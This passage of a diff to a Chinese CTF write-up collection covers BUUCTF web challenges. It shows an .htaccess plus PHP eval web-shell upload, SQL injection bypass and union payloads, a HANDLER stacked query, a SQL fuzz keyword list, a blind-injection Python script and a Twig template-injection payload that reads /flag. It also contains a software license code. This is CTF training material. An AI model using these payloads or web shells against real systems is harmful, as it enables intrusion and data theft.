+Content-Length: 410
+Origin: http://e709aeca-d1f0-4b12-b188-270d06214cb7.node5.buuoj.cn:81
+Connection: close
+Referer: http://e709aeca-d1f0-4b12-b188-270d06214cb7.node5.buuoj.cn:81/
+Cookie: PHPSESSID=aa0a1a04d8e88c5f310149314e0ae059
+Upgrade-Insecure-Requests: 1
+
+-----------------------------36243627783878118222275131329
+Content-Disposition: form-data; name="uploaded"; filename=".htaccess"
+Content-Type: image/jpeg
+
+<FilesMatch "abc" >
+SetHandler application/x-httpd-php
+</FilesMatch>
+-----------------------------36243627783878118222275131329
+Content-Disposition: form-data; name="submit"
+
+上传
+-----------------------------36243627783878118222275131329--
+
+```
+
+再上传abc文件：
+
+```http
+POST / HTTP/1.1
+Host: e709aeca-d1f0-4b12-b188-270d06214cb7.node5.buuoj.cn:81
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------36243627783878118222275131329
+Content-Length: 397
+Origin: http://e709aeca-d1f0-4b12-b188-270d06214cb7.node5.buuoj.cn:81
+Connection: close
+Referer: http://e709aeca-d1f0-4b12-b188-270d06214cb7.node5.buuoj.cn:81/
+Cookie: PHPSESSID=aa0a1a04d8e88c5f310149314e0ae059
+Upgrade-Insecure-Requests: 1
+
+-----------------------------36243627783878118222275131329
+Content-Disposition: form-data; name="uploaded"; filename="abc"
+Content-Type: image/jpeg
+
+GIF89a
+<script language='php'> @eval($_POST['pass']);</script>
+-----------------------------36243627783878118222275131329
+Content-Disposition: form-data; name="submit"
+
+上传
+-----------------------------36243627783878118222275131329--
+
+```
+
+蚁剑连接，拿到flag
+
+### 32. [GXYCTF2019]BabySQli
+
+万能密码：
+
+```
+1' or 1=1#
+```
+
+登录，CTRL U 查看源码，发现有提示：
+
+```html
+<!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5-->
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 
+<title>Do you know who am I?</title>
+
+
+
+do not hack me!
+```
+
+先base32解码再base64解码：
+
+![image-20240109111524431](buu_wp.assets/image-20240109111524431.png)
+
+得到sql语句：
+
+```sql
+select * from user where username = '$name'
+```
+
+需要使用联合查询构造虚拟查询记录进行登录：
+
+![img](buu_wp.assets/20201107203617325.png)
+
+如果我们使用联合查询访问，一个真实存在的用户名和一个我们自己编造的密码，就会使虚拟数据混淆admin密码，从而使我们成功登录，得到 flag；
+
+百度了下密码需要使用md5加密下，构造payload：
+
+```
+'union select 1,'admin','202cb962ac59075b964b07152d234b70'-- q  
+
+密码输入123
+```
+
+得到flag
+
+### 33. [GYCTF2020]Blacklist
+
+和7. [强网杯 2019]随便注 类似，但本题有过滤，需要使用HANDLER 来进行绕过：
+
+**Handler语法**
+
+- handler语句：一行一行的浏览一个表中的数据；
+- handler语句并不具备select语句的所有功能；
+- mysql专用的语句，并没有包含到SQL标准中；
+- HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表；
+
+```sql
+HANDLER tbl_name OPEN
+```
+
+打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。
+
+```
+HANDLER tbl_name READ FIRST
+```
+
+获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。
+
+```
+HANDLER tbl_name CLOSE
+```
+
+关闭打开的句柄。
+
+```
+HANDLER tbl_name READ index_name = value
+```
+
+通过索引列指定一个值，可以指定从哪一行开始,通过NEXT继续浏览。
+
+本题使用以下payload即可绕过：
+
+```
+1';handler FlagHere open;handler FlagHere read first;handler FlagHere close;#
+```
+
+![image-20240109152737709](buu_wp.assets/image-20240109152737709.png)
+
+### 34. [CISCN2019 华北赛区 Day2 Web1]Hack World
+
+sql fuzz字典：
+
+```
+length 
++
+handler
+like
+select 
+sleep
+database
+delete
+having
+or
+as
+-~
+BENCHMARK
+limit
+left
+select
+insert
+sys.schema_auto_increment_columns
+join
+right
+#
+&
+&&
+\
+handler
+-- -
+--
+--+
+INFORMATION
+--
+;
+!
+%
++
+xor
+<>
+(
+>
+<
+)
+.
+^
+=
+AND
+BY
+CAST
+COLUMN
+COUNT
+CREATE
+END
+case
+'1'='1
+when
+admin'
+"
+length 
++
+length
+REVERSE
+
+ascii
+select 
+database
+left
+right
+'
+union
+||
+oorr
+/
+//
+//*
+*/*
+/**/
+anandd
+GROUP
+HAVING
+IF
+INTO
+JOIN
+LEAVE
+LEFT
+LEVEL
+sleep
+LIKE
+NAMES
+NEXT
+NULL
+OF
+ON
+|
+infromation_schema
+user
+OR
+ORDER
+ORD
+SCHEMA
+SELECT
+SET
+TABLE
+THEN
+UPDATE
+USER
+USING
+VALUE
+VALUES
+WHEN
+WHERE
+ADD
+AND
+prepare
+set
+update
+delete
+drop
+inset
+CAST
+COLUMN
+CONCAT
+GROUP_CONCAT
+group_concat
+CREATE
+DATABASE
+DATABASES
+alter
+DELETE
+DROP
+floor
+rand()
+information_schema.tables
+TABLE_SCHEMA
+%df
+concat_ws()
+concat
+LIMIT
+ORD
+ON
+extractvalue
+order 
+CAST()
+by
+ORDER
+OUTFILE
+RENAME
+REPLACE
+SCHEMA
+SELECT
+SET
+updatexml
+SHOW
+SQL
+TABLE
+THEN
+TRUE
+instr
+benchmark
+format
+bin
+substring
+ord
+
+UPDATE
+VALUES
+VARCHAR
+VERSION
+WHEN
+WHERE
+/*
+`
+  
+,
+users
+%0a
+%0b
+mid
+for
+BEFORE
+REGEXP
+RLIKE
+in
+sys schemma
+SEPARATOR
+XOR
+CURSOR
+FLOOR
+sys.schema_table_statistics_with_buffer
+INFILE
+count
+%0c
+from
+%0d
+%a0
+=
+@
+else
+
+
+
+```
+
+搜索框输入1或2会返回结果，其他都返回bool(false)。过滤了union、and、or、空格等，包括`/**/`，有意思的是输入`1/1`时会正常返回结果，可以判断这是数字型的sql注入。
+
+根据1和2返回结果的不同，可能是bool盲注，`()`没有过滤，可以使用大部分函数；
+
+过滤空格绕过：
+
+- `%09` `%0a` `%0b` `%0c` `%0d` `/**/` `/*!*/`
+- 直接tab
+- 括号
+
+跑脚本注入：
+
+```python
+import requests
+import time
+import re
+
+url='http://5629f1a8-007e-4f49-97ea-082dbe4c62a0.node5.buuoj.cn:81/'#题目链接
+flag = ''
+
+for i in range(1,50):#for循环遍历，i表示flag值大致长度是50以内
+    max = 127
+    min = 0
+
+    for c in range(0,127):
+        s = (int)((max+min)/2)
+        payload = '1^(ascii(substr((select(flag)from(flag)),'+str(i)+',1))>'+str(s)+')'
+        #^异或运算符，相同为假，不相同为真，1^payload，若为payload结果为假，则返回0，1^0=1，将得到查询id=1时的结果，回显Hello, glzjin wants a girlfriend。
+        #从flag数据表中选择一个名为flag的字段，然后取这个字段的字符串（从位置 '+str(i)+' 开始，长度为 1（每次只返回一个））
+        #将这个字符串转换为 ASCII 码，然后判断这个 ASCII 码是否大于一个名为 "s" 的变量。
+        r = requests.post(url,data = {'id':payload})
+        time.sleep(0.5)
+
+        if 'Hello, glzjin wants a girlfriend' in str(r.content):
+            max=s
+        else:
+            min=s
+        if((max-min)<=1):
+            flag+=chr(max)
+            print(flag)
+            break
+```
+
+另外payload也可以如下：
+
+```sql
+if(ascii(substr((select(flag)from(flag)),1,1))=ascii('f'),1,2)  #该payload返回Hello, glzjin wants a girlfriend. 证明flag第一位为f
+
+```
+
+### 35. [网鼎杯 2018]Fakebook
+
+同adword 36. fakebook
+
+### 36. [BJDCTF2020]The mystery of ip
+
+- `X-Forwarded-For`（XFF，client-ip也可以）注入
+
+- **PHP**可能存在**Twig模版注入漏洞**
+
+
+
+payload：
+
+```http
+GET /flag.php HTTP/1.1
+Host: node5.buuoj.cn:26782
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Referer: http://node5.buuoj.cn:26782/hint.php
+Connection: close
+Upgrade-Insecure-Requests: 1
+X-Forwarded-For:{{system('cat /flag')}}
+
+
+```
+
+### 37. [网鼎杯 2020 朱雀组]phpweb
+
+
+
+### [网鼎杯 2020 青龙组]filejava
+
+
+
 ## Others
 
 ARCHPR破解码`ARCHPRP-GSVMT-66892-GKVMB-52992`
@@ -1954,3 +3587,18 @@ ARCHPR破解码`ARCHPRP-GSVMT-66892-GKVMB-52992`
 
 [CTF常用伪协议总结_compress.zlib ctf-CSDN博客](https://blog.csdn.net/weixin_51735061/article/details/123156046)
 
+[PHP伪协议_伪协议闭合-CSDN博客](https://blog.csdn.net/qq_53142368/article/details/116594299)
+
+[php://filter的各种过滤器_php://filter过滤器种类-CSDN博客](https://blog.csdn.net/qq_44657899/article/details/109300335)
+
+[SQL注入时当and、or等字符被过滤了怎么办_sql注入and被过滤-CSDN博客](https://blog.csdn.net/weixin_40950781/article/details/100061268)
+
+[sql注入绕WAF的N种姿势-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/268428#:~:text=当 order by 被过滤时，可以使用 into 变量名进行代替。 4.and%2For绕过 主流的,、or、xor进行拦截。 替代字符：and 等于%26%26、or 等于 ||、not 等于 !、xor 等于|)
+
+[.user.ini文件构成的PHP后门 - phith0n (wooyun.js.org)](https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html)
+
+[php中的exec()函数怎么用-php教程-PHP中文网](https://www.php.cn/faq/80395.html)
+
+[call_user_func_array函数详解-CSDN博客](https://blog.csdn.net/weihuiblog/article/details/78998924)
+
+[php strcmp()漏洞_php strcmp 漏洞-CSDN博客](https://blog.csdn.net/cherrie007/article/details/77473817)
